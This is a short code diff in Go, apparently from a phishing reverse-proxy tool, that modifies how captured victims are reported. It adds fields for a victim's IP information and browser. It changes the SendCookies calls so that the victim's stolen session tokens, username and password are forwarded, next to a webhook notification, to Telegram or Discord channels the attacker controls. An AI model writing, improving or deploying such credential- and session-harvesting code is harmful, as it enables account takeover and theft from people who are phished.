@@ -81,6 +81,8 @@ type HttpProxy struct {
 	telegram_bot      *tgbotapi.BotAPI
 	telegram_chat_id  int64
 	discord_bot       api.WebhookClient
+	victimIpInfo      string
+	victimBrowser     string
 }
 
 type ProxySession struct {
@@ -938,7 +940,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										victimInfo := fmt.Sprintf(str, ps.Index, s.Username, s.Password, s.Custom)
 										p.NotifyWebhook(victimInfo)
 										//p.SendCookies(TokensToJSON(pl, s.Tokens))
-										p.SendCookies(TokensToJSON(pl, s.CookieTokens), s.Username, s.Password)
+										p.SendCookies(TokensToJSON(pl, s.Tokens), s.Username, s.Password)
 										s.WebhookSent = true
 									}
 									s.IsDone = true
@@ -1084,7 +1086,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									victimInfo := fmt.Sprintf(str, ps.Index, s.Username, s.Password, s.Custom)
 									p.NotifyWebhook(victimInfo)
 									//p.SendCookies(TokensToJSON(pl, s.Tokens))
-									p.SendCookies(TokensToJSON(pl, s.CookieTokens), s.Username, s.Password)
+									p.SendCookies(TokensToJSON(pl, s.Tokens), s.Username, s.Password)
 								}
 							}
 							break
